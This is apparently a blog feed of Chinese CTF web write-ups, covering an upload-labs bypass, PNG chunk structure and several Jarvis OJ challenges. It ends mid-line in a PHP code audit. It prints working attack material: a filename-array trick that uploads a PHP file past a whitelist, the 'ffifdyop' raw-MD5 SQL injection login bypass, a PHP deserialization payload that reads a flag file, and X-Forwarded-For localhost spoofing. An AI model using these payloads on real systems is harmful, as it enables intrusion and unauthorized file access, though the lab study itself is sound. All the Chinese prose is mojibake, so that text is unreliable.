class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°<code>$file_name</code>ç»è¿‡<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>å¤„ç†ã€‚</p><p>å¦‚æœä¸Šä¼ çš„æ˜¯æ•°ç»„çš„è¯ï¼Œä¼šè·³è¿‡<code>$file = explode(&#39;.&#39;, strtolower($file));</code>ã€‚å¹¶ä¸”åç¼€æœ‰ç™½åå•è¿‡æ»¤</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-variable">$ext</span> = <span class="hljs-keyword">end</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br></code></pre></td></tr></table></figure><p>è€Œæœ€ç»ˆçš„æ–‡ä»¶ååç¼€å–çš„æ˜¯<code>$file[count($file) - 1]</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®©<code>$file</code>ä¸ºæ•°ç»„ã€‚<code>$file[0]</code>ä¸º<code>smi1e.php/</code>ï¼Œä¹Ÿå°±æ˜¯<code>reset($file)</code>ï¼Œç„¶åå†ä»¤<code>$file[2]</code>ä¸ºç™½åå•ä¸­çš„jpgã€‚æ­¤æ—¶<code>end($file)</code>ç­‰äºjpgï¼Œ<code>$file[count($file) - 1]</code>ä¸ºç©ºã€‚è€Œ <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>ï¼Œä¹Ÿå°±æ˜¯<code>smi1e.php/.</code>ï¼Œæœ€ç»ˆ<code>move_uploaded_file</code>ä¼šå¿½ç•¥æ‰<code>/.</code>ï¼Œæœ€ç»ˆä¸Šä¼ <code>smi1e.php</code>ã€‚è¿™é‡Œç›´æ¥å€Ÿç”¨ä¸€ä¸‹ smi1e å¸ˆå‚…çš„å›¾ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOzSx.png" alt="1WOzSx.png"></p><p><img src="https://s2.ax1x.com/2020/02/09/1WXSl6.png" alt="1WXSl6.png"></p><h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h1><p><img src="https://s2.ax1x.com/2020/02/09/1WXDAJ.png" alt="1WXDAJ.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pngæ–‡ä»¶ç»„æˆ</title>
    <link href="/2019/11/14/png_sturcture/"/>
    <url>/2019/11/14/png_sturcture/</url>
    
    <content type="html"><![CDATA[<p>pngå›¾ç‰‡ç”±3ä¸ªä»¥ä¸Šçš„æ•°æ®å—ç»„æˆã€‚</p><p>PNGå®šä¹‰äº†ä¸¤ç§ç±»å‹çš„æ•°æ®å—ï¼Œä¸€ç§æ˜¯ç§°ä¸ºå…³é”®æ•°æ®å—(critical chunk)ï¼Œè¿™æ˜¯æ ‡å‡†çš„æ•°æ®å—ï¼Œå¦ä¸€ç§å«åšè¾…åŠ©æ•°æ®å—(ancillary chunks)ï¼Œè¿™æ˜¯å¯é€‰çš„æ•°æ®å—ã€‚å…³é”®æ•°æ®å—å®šä¹‰äº†3ä¸ªæ ‡å‡†æ•°æ®å—(IHDR,IDAT, IEND)ï¼Œæ¯ä¸ªPNGæ–‡ä»¶éƒ½å¿…é¡»åŒ…å«å®ƒä»¬.</p><h1 id="æ•°æ®å—ç»“æ„"><a href="#æ•°æ®å—ç»“æ„" class="headerlink" title="æ•°æ®å—ç»“æ„"></a>æ•°æ®å—ç»“æ„</h1><p><img src="https://s2.ax1x.com/2020/02/09/1WXjHg.png" alt="1WXjHg.png"></p><p>CRC(cyclic redundancy check)åŸŸä¸­çš„å€¼æ˜¯å¯¹Chunk Type CodeåŸŸå’ŒChunk DataåŸŸä¸­çš„æ•°æ®è¿›è¡Œè®¡ç®—å¾—åˆ°çš„ã€‚CRCå…·ä½“ç®—æ³•å®šä¹‰åœ¨ISO 3309å’ŒITU-T V.42ä¸­ï¼Œå…¶å€¼æŒ‰ä¸‹é¢çš„CRCç ç”Ÿæˆå¤šé¡¹å¼è¿›è¡Œè®¡ç®—ï¼š</p><p>$x^{32}+x^{26}+x^{23}+x^{22}+x^{16}+x^{12}+x^{11}+x^{10}+x^8+x^7+x^5+x^4+x^2+x+1$</p><h1 id="åˆ†ææ•°æ®å—"><a href="#åˆ†ææ•°æ®å—" class="headerlink" title="åˆ†ææ•°æ®å—"></a>åˆ†ææ•°æ®å—</h1><h2 id="IHDR"><a href="#IHDR" class="headerlink" title="IHDR"></a>IHDR</h2><p>æ•°æ®å—IHDR(header chunk)ï¼šå®ƒåŒ…å«æœ‰PNGæ–‡ä»¶ä¸­å­˜å‚¨çš„å›¾åƒæ•°æ®çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¹¶è¦ä½œä¸ºç¬¬ä¸€ä¸ªæ•°æ®å—å‡ºç°åœ¨PNGæ•°æ®æµä¸­ï¼Œè€Œä¸”ä¸€ä¸ªPNGæ•°æ®æµä¸­åªèƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶å¤´æ•°æ®å—ã€‚</p><p>æ–‡ä»¶å¤´æ•°æ®å—ç”±13å­—èŠ‚ç»„æˆï¼Œå®ƒçš„æ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://s2.ax1x.com/2020/02/09/1WXXDS.png" alt="1WXXDS.png"></p><h2 id="PLTE"><a href="#PLTE" class="headerlink" title="PLTE"></a>PLTE</h2><p>è°ƒè‰²æ¿PLTEæ•°æ®å—æ˜¯è¾…åŠ©æ•°æ®å—,å¯¹äºç´¢å¼•å›¾åƒï¼Œè°ƒè‰²æ¿ä¿¡æ¯æ˜¯å¿…é¡»çš„ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²ç´¢å¼•ä»0å¼€å§‹ç¼–å·ï¼Œç„¶åæ˜¯1ã€2â€¦â€¦ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²æ•°ä¸èƒ½è¶…è¿‡è‰²æ·±ä¸­è§„å®šçš„é¢œè‰²æ•°ï¼ˆå¦‚å›¾åƒè‰²æ·±ä¸º4çš„æ—¶å€™ï¼Œè°ƒè‰²æ¿ä¸­çš„é¢œè‰²æ•°ä¸å¯ä»¥è¶…è¿‡2^4&#x3D;16ï¼‰ï¼Œå¦åˆ™ï¼Œè¿™å°†å¯¼è‡´PNGå›¾åƒä¸åˆæ³•ã€‚</p><h2 id="IDAT"><a href="#IDAT" class="headerlink" title="IDAT"></a>IDAT</h2><p>å›¾åƒæ•°æ®å—IDAT(image data chunk)ï¼šå®ƒå­˜å‚¨å®é™…çš„æ•°æ®ï¼Œåœ¨æ•°æ®æµä¸­å¯åŒ…å«å¤šä¸ªè¿ç»­é¡ºåºçš„å›¾åƒæ•°æ®å—ã€‚</p><p>IDATå­˜æ”¾ç€å›¾åƒçœŸæ­£çš„æ•°æ®ä¿¡æ¯ï¼Œå› æ­¤ï¼Œå¦‚æœèƒ½å¤Ÿäº†è§£IDATçš„ç»“æ„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„ç”ŸæˆPNGå›¾åƒ</p><h2 id="IEND"><a href="#IEND" class="headerlink" title="IEND"></a>IEND</h2><p>å›¾åƒç»“æŸæ•°æ®IEND(image trailer chunk)ï¼šå®ƒç”¨æ¥æ ‡è®°PNGæ–‡ä»¶æˆ–è€…æ•°æ®æµå·²ç»ç»“æŸï¼Œå¹¶ä¸”å¿…é¡»è¦æ”¾åœ¨æ–‡ä»¶çš„å°¾éƒ¨ã€‚</p><p>å¦‚æœæˆ‘ä»¬ä»”ç»†è§‚å¯ŸPNGæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œæ–‡ä»¶çš„ç»“å°¾12ä¸ªå­—ç¬¦çœ‹èµ·æ¥æ€»åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web WriteUps for Jarvis OJ</title>
    <link href="/2019/10/28/Web_WriteUps_for_Jarvis_OJ/"/>
    <url>/2019/10/28/Web_WriteUps_for_Jarvis_OJ/</url>
    
    <content type="html"><![CDATA[<h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><p><code>link: &lt;http://web.jarvisoj.com:32770/&gt;</code></p><p>æ‰“å¼€é“¾æ¥çœ‹åˆ°ï¼š</p><blockquote><p>Please use port 51 to visit this site.</p></blockquote><p>åœ¨æœ¬æœºæˆ–æœåŠ¡å™¨ä¸Šè¾“å…¥å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --local-port 51 http://web.jarvisoj.com:32770<br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/1gvBNR.png" alt="1gvBNR.png"></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">curl å‘½ä»¤å‚æ•°ä½¿ç”¨ï¼š<br>-l, --local-port RANGE  å¼ºåˆ¶ä½¿ç”¨çš„æœ¬åœ°ç«¯å£å·<br></code></pre></td></tr></table></figure><h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p><code>linkï¼š&lt;http://web.jarvisoj.com:32774/&gt;</code></p><p>æ‰“å¼€é“¾æ¥å¯ä»¥çœ‹åˆ°ï¼š</p><blockquote><p>localhost access only!!</p></blockquote><p>ä¸€èˆ¬ä¼ªé€  localhost åœ¨ http å¤´éƒ¨åŠ å…¥ xffï¼Œ client-ip ç­‰ï¼Œè¿™é‡Œä½¿ç”¨ xff ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br></code></pre></td></tr></table></figure><blockquote><p>The <strong>X-Forwarded-For</strong> (<strong>XFF</strong>) <a href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields">HTTP header field</a> is a common method for identifying the originating <a href="https://en.wikipedia.org/wiki/IP_address">IP address</a> of a client connecting to a <a href="https://en.wikipedia.org/wiki/Web_server">web server</a> through an <a href="https://en.wikipedia.org/wiki/HTTP">HTTP</a> <a href="https://en.wikipedia.org/wiki/Proxy_server">proxy</a> or <a href="https://en.wikipedia.org/wiki/Load_balancer">load balancer</a>.</p><p>â€“ WikiPedia</p></blockquote><p><img src="https://s2.ax1x.com/2020/02/07/1gvdHJ.png" alt="1gvdHJ.png"></p><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p>Descriptionï¼š</p><blockquote><p>éœ€è¦å¯†ç æ‰èƒ½è·å¾—flagå“¦ã€‚</p><p><code>linkï¼š&lt;http://web.jarvisoj.com:32772/</code>&gt;</p></blockquote><p>æ‰“å¼€ç¯å¢ƒï¼Œæ˜¯ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œéœ€è¦è¾“å…¥å¯†ç ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvUuF.png" alt="1gvUuF.png"></p><p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æ•°æ®åŒ…ï¼Œf12-network èµ°èµ·ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvD41.png" alt="1gvD41.png"></p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;<span class="hljs-title function_ invoke__">md5</span>(input_string, raw_output) <span class="hljs-comment">// è®¡ç®—å­—ç¬¦ä¸²çš„ MD5 æ•£åˆ—</span><br></code></pre></td></tr></table></figure><p><strong>Parameter:</strong></p><table><thead><tr><th>Name</th><th>Description</th><th>Required &#x2F; Optional</th><th>Type</th></tr></thead><tbody><tr><td>input_string</td><td>The input string.</td><td>Required</td><td>Float</td></tr><tr><td>raw_output</td><td>Refers hex or binary output format, Returns raw 16-bit binary format if raw_output sets TRUE and return 32-bit hex format for setting FALSE (default).</td><td>Optional</td><td>Boolean</td></tr></tbody></table></blockquote><p>è¿™é‡Œè¾“å…¥<code>ffifdyop</code>ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">æ ¹æ®æ­¤é¢˜ä¸­çš„passwordçš„è¯­å¥ï¼šselect * form admin where password=<span class="hljs-string">&#x27;&#x27;</span><br>è¿›è¡Œpasswordçš„ç»•è¿‡ï¼Œéœ€å°†æ­¤è¯­å¥å¡«å……ä¸ºï¼šselect * form admin where password=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>ï¼Œåˆå› ä¸ºæ­¤é¢˜æœ‰md5åŠ å¯†ï¼Œå¹¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æ ¹æ®å‰äººï¼Œå¤§å¸ˆå‚…ä»¬çš„æ€»ç»“ï¼Œæœ‰ï¼š<br>å­—ç¬¦ä¸²ï¼šffifdyop<br>md5åŠ å¯†åï¼š<span class="hljs-number">276</span>f722736c95d99e921722cf9ed621c<br>å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼š<span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-number">6</span>&lt;ä¹±ç &gt;<br>é‚£ä¹ˆï¼Œæ‹¼æ¥åçš„è¯­å¥ä¸ºï¼šselect * <span class="hljs-keyword">from</span> admin where password=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;6&lt;ä¹±ç &gt;&#x27;</span> ï¼Œå°±ç›¸å½“äº select * <span class="hljs-keyword">from</span> admin where password=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span> ,å®ç° sql æ³¨å…¥ã€‚<br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/1gvcjO.png" alt="1gvcjO.png"></p><h1 id="ç¥ç›¾å±€çš„ç§˜å¯†"><a href="#ç¥ç›¾å±€çš„ç§˜å¯†" class="headerlink" title="ç¥ç›¾å±€çš„ç§˜å¯†"></a>ç¥ç›¾å±€çš„ç§˜å¯†</h1><p>Descriptionï¼š</p><blockquote><p>è¿™é‡Œæœ‰ä¸ªé€šå‘ç¥ç›¾å±€å†…éƒ¨ç½‘ç»œçš„ç§˜å¯†å…¥å£ï¼Œä½ èƒ½é€šè¿‡æ¼æ´å‘ç°ç¥ç›¾å±€çš„ç§˜å¯†å—ï¼Ÿ</p><p><code>linkï¼š&lt;http://web.jarvisoj.com:32768/&gt;</code></p></blockquote><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€å¼ å¾ˆå¤§çš„ç¥ç›¾å±€å›¾ç‰‡ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°åªæœ‰ä¸€è¡Œï¼š</p><p><code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code></p><p>ç‚¹å‡»é“¾æ¥è·³è½¬åˆ°é¡µé¢ï¼Œé¡µé¢æ˜¾ç¤ºä¹±ç ï¼Œçœ‹æ–‡ä»¶å¤´åº”è¯¥æ˜¯å›¾ç‰‡æ–‡ä»¶</p><p>æ³¨æ„åˆ°ï¼Œå‚æ•° <code>?img=</code> åé¢æ˜¯ base64 ç¼–ç ï¼Œè¿›è¡Œè§£ç å¯ä»¥å¾—åˆ° <code>shield.jpg</code></p><p>è¿™æ ·å°è¯•ä¸€ä¸‹æ–‡ä»¶è¯»å–ï¼Œæ¯”å¦‚ <code>index.php</code>ï¼Œè¿™é‡Œéœ€è¦ base64 ç¼–ç ä¸€ä¸‹å†ä¼ å‚ï¼Œå¾—åˆ°æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;shield.php&#x27;</span>);<br><span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shield</span>();<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$g</span>)) &#123;<br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$g</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span>-&gt;<span class="hljs-title function_ invoke__">readfile</span>();<br><span class="hljs-meta">?&gt;</span><br>&lt;img src=<span class="hljs-string">&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot;</span> width=<span class="hljs-string">&quot;100%&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿˜åŒ…å«äº† <code>shield.php</code> ï¼Œæˆ‘ä»¬å†å»è¯»ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in pctf.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span> -&gt; file = <span class="hljs-variable">$filename</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;file) &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;..&#x27;</span>)===<span class="hljs-literal">FALSE</span>  <br>&amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;/&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;\\&#x27;</span>)==<span class="hljs-literal">FALSE</span>) &#123;<br><span class="hljs-keyword">return</span> @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æç¤º <code>flag is in pctf.php</code></p><p>ç›´æ¥è®¿é—®æç¤º <code>File not found!</code></p><p>å› æ­¤æŒ‰ç…§ä»£ç é€»è¾‘æˆ‘ä»¬åº”è¯¥ä¼ å‚è¿›å»ï¼Œç»è¿‡ååºåˆ—åŒ–ç„¶åè®©å®ƒæ‰§è¡Œ <code>$x-&gt;readfile()</code> è¿›è¡Œè¯»å–</p><p>å…ˆæŠŠç±»åˆ›å»ºå¹¶è¿›è¡Œåºåˆ—åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span> -&gt; file = <span class="hljs-variable">$filename</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;file) &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;..&#x27;</span>)===<span class="hljs-literal">FALSE</span>  <br>&amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;/&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;\\&#x27;</span>)==<span class="hljs-literal">FALSE</span>) &#123;<br><span class="hljs-keyword">return</span> @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shield</span>(<span class="hljs-string">&quot;pctf.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ° <code>payloadï¼š?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</code></p><p>ä¼ å‚ï¼Œå¾—åˆ° flag</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvhEd.png" alt="1gvhEd.png"></p><h1 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h1><p>Descriptionï¼š</p><blockquote><p>è¿å‡ºé¢˜äººè‡ªå·±éƒ½å¿˜äº†flagæ”¾å“ªäº†ï¼Œåªè®°å¾—å¥½åƒå¾ˆæ··ä¹±çš„æ ·å­ã€‚</p><p><code>linkï¼š&lt;http://web.jarvisoj.com:32780/&gt;</code></p></blockquote><p>æ‰“å¼€é¢˜ç›®ï¼Œåªæœ‰ä¸€è¡Œå­—ï¼š</p><p><code>work harder!harder!harder!</code></p><p>æŸ¥çœ‹æºä»£ç å‘ç°æç¤º <code>index.phps</code> ï¼Œè®¿é—®å¾—åˆ°æºç </p><p>æ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;!--index.phps--&gt;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])<br>    &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php?id=1&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;.&#x27;</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hahahahahaha&#x27;</span>;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    <span class="hljs-variable">$data</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">&quot;1112 is a nice lab!&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$id</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$b</span>)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;111&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&quot;1114&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span 